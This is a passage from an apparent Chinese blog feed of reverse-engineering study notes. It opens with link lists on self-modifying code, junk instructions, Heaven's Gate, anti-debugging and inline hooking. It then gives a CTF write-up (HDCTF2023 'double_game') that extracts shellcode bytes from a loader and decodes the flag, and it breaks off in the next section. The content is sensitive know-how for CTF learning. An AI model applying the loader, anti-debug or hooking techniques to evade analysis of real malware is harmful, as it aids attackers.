class="markdownIt-Anchor" href="#领航杯maze"></a> [领航杯]maze</h4><p>​具体内容看本地wp</p><h2 id="smc"><a class="markdownIt-Anchor" href="#smc"></a> SMC</h2><p><a href="https://mp.weixin.qq.com/s/b32h0PUgXKBATMWbPvdVgQ">SMC技术浅析</a></p><h2 id="花指令"><a class="markdownIt-Anchor" href="#花指令"></a> 花指令</h2><p><a href="https://nnnewb.github.io/blog/p/learning-packer-07/">花指令入门</a></p><p><a href="https://www.cnblogs.com/ioriwellings/p/17062430.html">花指令</a></p><p><a href="https://www.anquanke.com/post/id/236490#h2-11">花指令总结</a></p><h2 id="天堂之门"><a class="markdownIt-Anchor" href="#天堂之门"></a> 天堂之门</h2><p><a href="https://bbs.kanxue.com/thread-270153.htm">天堂之门(Heaven’s Gate)C语言实现</a></p><p><a href="https://taardisaa.github.io/2021/09/25/Heaven'sGate/">天堂之门分析</a></p><h2 id="软件加壳"><a class="markdownIt-Anchor" href="#软件加壳"></a> 软件加壳</h2><h2 id="控制流平坦化"><a class="markdownIt-Anchor" href="#控制流平坦化"></a> 控制流平坦化</h2><blockquote><p>IDA中D-810插件</p></blockquote><h2 id="mov-ofuscator"><a class="markdownIt-Anchor" href="#mov-ofuscator"></a> mov-ofuscator</h2><h2 id="other"><a class="markdownIt-Anchor" href="#other"></a> Other</h2><ul><li>资源文件操作 <a href="https://www.jb51.net/program/3073594li.htm">vs教程</a></li></ul><h1 id="编程语言相关"><a class="markdownIt-Anchor" href="#编程语言相关"></a> 编程语言相关</h1><h2 id="python"><a class="markdownIt-Anchor" href="#python"></a> Python</h2><h3 id="pyc"><a class="markdownIt-Anchor" href="#pyc"></a> pyc</h3><p><strong>视频</strong></p><ul><li><a href="https://www.bilibili.com/video/BV1JL4y1p7Tt/?spm_id_from=333.999.0.0&amp;vd_source=832f0671898da1eb3db5433b29bbb9c0">【Python逆向】浅谈CTF-Python逆向</a></li><li>对视频的博客讲解<a href="https://forum.butian.net/share/1618">浅谈ctf中的python逆向</a></li></ul><p><strong>方法</strong></p><ul><li>对于 python 版本较低的 pyc 文件，可以使用 uncompyle6/pycdc 进行反编译成 py 文件</li><li>对于 python 版本较高的 pyc 文件，则需要使用 pydas 反编译成字节码，通过阅读字节码来理清逻辑</li><li>对于某些exe的反编译需要注意 python版本，不然核心逻辑的文件夹 <code>PYZ-00.pyz_extracted</code> 可能为空</li></ul><h2 id="c"><a class="markdownIt-Anchor" href="#c"></a> C#</h2><p>一般就是使用 <code>dyspy\ILspy</code>(也可以用来unity逆向) 进行逆向，需要学会调试机巧，知道其具体逻辑，明白文件含义。</p><ul><li><p>例题 <code>[FlareOn1]Bob Doge</code>， <code>[FlareOn5]Ultimate Minesweeper</code>，<a href="https://blog.csdn.net/qq_45771413/article/details/115859063">FlareOn5 Ultimate Minesweeper</a></p></li><li><p>还有什么AOT混淆</p></li></ul><h3 id="unity游戏"><a class="markdownIt-Anchor" href="#unity游戏"></a> Unity游戏</h3><ul><li>相关信息一般放在<code>assets\\bin\\Data\\Managed\\Assembly-CSharp.dll</code>里，可以直接IDA查看</li><li>例题： <code>[MRCTF2020]PixelShooter</code></li></ul><h2 id="lua"><a class="markdownIt-Anchor" href="#lua"></a> Lua</h2><p><a href="https://bbs.kanxue.com/thread-275620.htm">lua逆向学习</a></p><h1 id="操作系统特性"><a class="markdownIt-Anchor" href="#操作系统特性"></a> 操作系统特性</h1><h2 id="windows"><a class="markdownIt-Anchor" href="#windows"></a> Windows</h2><h3 id="pe结构"><a class="markdownIt-Anchor" href="#pe结构"></a> PE结构</h3><p><strong>博客</strong></p><p><a href="https://www.cnblogs.com/VxerLee/p/15498560.html">PE头详细分析</a></p><p><a href="https://www.cnblogs.com/VxerLee/p/15518129.html">PE节表详细分析</a></p><p><a href="https://gh0st.cn/Binary-Learning/PE%E5%9F%BA%E7%A1%80.html">PE基础</a></p><h3 id="异常处理"><a class="markdownIt-Anchor" href="#异常处理"></a> 异常处理</h3><h4 id="seh"><a class="markdownIt-Anchor" href="#seh"></a> SEH</h4><p><a href="http://betacat.github.io/2011/10/19/SEH-x86/">SEH x86</a></p><p><a href="http://betacat.github.io/2011/11/04/SEH-x64/">SEH x64</a></p><p><a href="https://www.yunzh1jun.com/2022/05/27/WindowsSEH/">SEH 学习笔记</a></p><h3 id="反调试"><a class="markdownIt-Anchor" href="#反调试"></a> 反调试</h3><p><a href="https://www.yunzh1jun.com/2022/05/19/anti_dbg/">反调试总结</a></p><p><a href="https://ctf-wiki.org/reverse/platform/windows/anti-debug/ntglobalflag/">Wiki知识点</a></p><p><a href="https://bbs.kanxue.com/thread-225740.htm">反调试技术总结</a></p><h3 id="hook"><a class="markdownIt-Anchor" href="#hook"></a> hook</h3><h4 id="inline-hook"><a class="markdownIt-Anchor" href="#inline-hook"></a> inline hook</h4><p><a href="https://bbs.kanxue.com/thread-252074.htm">稳定多线程中的inline hook-编程技术-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://bbs.kanxue.com/thread-271098.htm">万字长文！inlinehook看这一篇足够了！-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://www.cnblogs.com/PeaZomboss/p/17131778.html">Windows下x86和x64平台的Inline Hook介绍 - PeacoorZomboss - 博客园 (cnblogs.com)</a></p><ul><li>这里注意hook的函数与原函数函数类型必须保持一致</li></ul><h1 id="工具及配置"><a class="markdownIt-Anchor" href="#工具及配置"></a> 工具及配置</h1><h2 id="angr"><a class="markdownIt-Anchor" href="#angr"></a> <strong>Angr</strong></h2><h3 id="配置与学习"><a class="markdownIt-Anchor" href="#配置与学习"></a> 配置与学习</h3><p><strong>安装</strong></p><ul><li>Windows中pip直接下载(建议使用python虚拟环境下载)</li><li>Linux中使用包处理详细配置</li></ul><p><strong>博客</strong></p><ul><li><a href="https://blog.gentlecp.com/article/61784.html">基础篇</a> ， <a href="https://blog.gentlecp.com/article/3571.html">提高篇</a> ， <a href="https://blog.gentlecp.com/article/26999.html">进阶篇</a></li></ul><p><strong>视频</strong></p><ul><li><a href="https://space.bilibili.com/386563875/video">视频讲解</a></li></ul><h2 id="sagemath"><a class="markdownIt-Anchor" href="#sagemath"></a> Sagemath</h2><p><strong>下载</strong></p><p><a href="https://www.jianshu.com/p/8f37af3d3ae5">wsl2安装和使用 sagemath</a></p><p><a href="https://blog.csdn.net/amphetham/article/details/117166099">/usr/bin/env: “python”: 没有那个文件或目录——解决办法</a></p><h2 id="ollydbg"><a class="markdownIt-Anchor" href="#ollydbg"></a> OllyDbg</h2><p><strong>安装</strong></p><ul><li><a href="https://www.52pojie.cn/thread-239996-1-1.html">OllyDBG v2.01 汉化版 + 集成插件</a></li></ul><p><strong>添加右键菜单</strong></p><blockquote><p>这里可以直接使用软件进行添加</p></blockquote><p><a href="https://blog.csdn.net/qq_44705203/article/details/119966938">参考博客</a></p><ul><li>Icon的数值为完整路径</li><li>command的数值为完整路径和&quot;%1&quot;(与一开始自定义项中的默认不同，那个为定义的名称)</li></ul><h2 id="java环境配置"><a class="markdownIt-Anchor" href="#java环境配置"></a> java环境配置</h2><p><a href="https://blog.csdn.net/xhmico/article/details/122390181">java 环境配置(详细教程)</a></p><ul><li>博客中的java_Home改成JAVA_HOME</li><li>CLASSPATH可以不配置，这是jdk历史遗留问题</li></ul>]]></content>
    
    
    <categories>
      
      <category>逆向笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一些记录</title>
    <link href="/posts/a87d0386.html"/>
    <url>/posts/a87d0386.html</url>
    
    <content type="html"><![CDATA[<h1 id="hdctf2023"><a class="markdownIt-Anchor" href="#hdctf2023"></a> HDCTF2023</h1><h2 id="double_game"><a class="markdownIt-Anchor" href="#double_game"></a> double_game</h2><h3 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h3><ul><li><p>打开ida，发现是一个非常典型的上线器，shellcode loader。我们需要做的是找到其中的shellcode。这是 WP 说的，但是没有理解 shellcode loader 的含义，目前我的认识就是它加载 shellcode，然后顺利执行 shellcode</p><p>一个介绍的文章 <a href="https://paper.seebug.org/1413/">如何实现一款 shellcodeLoader</a></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304242327238.png" alt="image-20230424232717199" /></p></li><li><p>这个地方加载了 <code>sub_</code>，这里就是 shellcode</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304242328475.png" alt="image-20230424232802405" /></p></li><li><p>查看后发现 IDA 将这里反编译成了一个函数，但是逻辑还是有点困难，那么就将这个 shellcode的内容复制下来，整合为一个文件，然后再使用ida打开文件分析</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304242329993.png" alt="image-20230424232945959" /></p></li><li><p>这里是 <code>u</code> + <code>p</code> 后的结果，重新生成函数后就很好认了</p></li></ul><h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h3><ul><li>以二进制写入文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br>list_dec = [<span class="hljs-number">0x55</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xE8</span>,<br>  <span class="hljs-number">0x52</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>,<br>  <span class="hljs-number">0x24</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x54</span>,<br>  <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>,<br>  <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>,<br>  <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>,<br>  <span class="hljs-number">0x24</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x2F</span>,<br>  <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>,<br>  <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>,<br>  <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>,<br>  <span class="hljs-number">0x24</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x43</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8D</span>,<br>  <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x01</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xEB</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x66</span>,<br>  <span class="hljs-number">0x66</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC8</span>,<br>  <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x02</span>,<br>  <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x58</span>,<br>  <span class="hljs-number">0x83</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x24</span>,<br>  <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x83</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x8B</span>,<br>  <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x8D</span>,<br>  <span class="hljs-number">0x54</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x0F</span>,<br>  <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x8B</span>,<br>  <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x83</span>,<br>  <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1F</span>,<br>  <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8D</span>,<br>  <span class="hljs-number">0x50</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>,<br>  <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x58</span>,<br>  <span class="hljs-number">0x04</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>,<br>  <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x8D</span>, <br>  <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x88</span>,<br>  <span class="hljs-number">0x10</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x1C</span>,<br>  <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD0</span>,<br>  <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1F</span>,<br>  <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x44</span>,<br>  <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xC3</span>]<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hexBin.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> list_dec:<br>        a = struct.pack(<span class="hljs-string">&#x27;B&#x27;</span>, x)<span class="hljs-comment"># struct.pack将要变成字节的数据打包然后以字节的形式写入到二进制文件，字节的形式是b&#x27;\x01&#x27;</span><br>        fp.write(a)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;done&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>得到flag</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = [<span class="hljs-number">0x48</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x6a</span>,<span class="hljs-number">0x30</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x5b</span>,<span class="hljs-number">0x30</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x7c</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x2d</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x7d</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>  tmp = i % <span class="hljs-number">5</span><br>  <span class="hljs-keyword">if</span> tmp == <span class="hljs-number">1</span>:<br>    enc[i] ^= <span class="hljs-number">0x23</span><br>  <span class="hljs-keyword">elif</span> tmp == <span class="hljs-number">2</span>:<br>    enc[i] -= <span class="hljs-number">2</span><br>  <span class="hljs-keyword">elif</span> tmp == <span class="hljs-number">3</span>:<br>    enc[i] += <span class="hljs-number">3</span><br>  <span class="hljs-keyword">elif</span> tmp == <span class="hljs-number">4</span>:<br>    enc[i] += <span class="hljs-number">4</span><br>  <span class="hljs-keyword">elif</span> tmp == <span class="hljs-number">5</span>:<br>    enc[i] += <span class="hljs-number">25</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>  flag += <span class="hljs-built_in">chr</span>(enc[i])<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="enc"><a class="markdownIt-Anchor" href="#enc"></a> enc</h2><h3 id="分析1"><a class="markdownIt-Anchor" href="#分析1"></a> 分析1</h3><ul><li>先是一个 TEA 找到密钥，这里注意格式与往常不太一样，这里要注意和普遍脚本之间的区别。最后得到了密钥 <code>0x3</code></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304251425960.png" alt="image-20230425142555881" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304251426260.png" alt="image-20230425142607216" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 